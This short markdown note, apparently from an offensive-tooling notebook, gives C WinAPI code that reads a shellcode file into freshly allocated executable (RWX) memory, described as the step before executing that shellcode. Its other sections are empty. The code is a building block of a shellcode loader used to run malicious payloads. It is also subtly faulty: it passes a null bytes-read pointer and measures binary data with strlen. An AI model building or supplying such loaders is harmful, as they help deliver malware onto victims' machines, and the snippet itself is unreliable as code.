# Read Binary File

## Scripting

```c

```

## C Runtime

```c

```

## WinAPI

Read the binary file and then execute to load the shellcode.

```c
#include <stdio.h>
#include <Windows.h>

LPVOID readShellcode(LPCSTR shellcodeFile) {
	LPVOID shellcodeBuffer = VirtualAlloc(NULL, SIZE_SHELLCODE_BUFFER, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	LPDWORD bytesRead = 0;
	
	HANDLE fHandle = CreateFileA(shellcodeFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fHandle == INVALID_HANDLE_VALUE) {
		printf("Could not open shellcode file.\n");
		ExitProcess(-1);
	}

	if (ReadFile(fHandle, shellcodeBuffer, SIZE_SHELLCODE_BUFFER, bytesRead, NULL) < 1) {
		printf("Could not read shellcode file.\n");
		ExitProcess(-1);
	}

	printf("Successfully read shellcode to 0x%x with size of 0x%x bytes.\n", shellcodeBuffer, strlen((char*)shellcodeBuffer));
	return shellcodeBuffer;
}
```

---
## References

### InstallSetupConfig

- [InstallSetupConfig: The Windows File Management 23](https://www.installsetupconfig.com/win32programming/windowsfileapis4_22.html)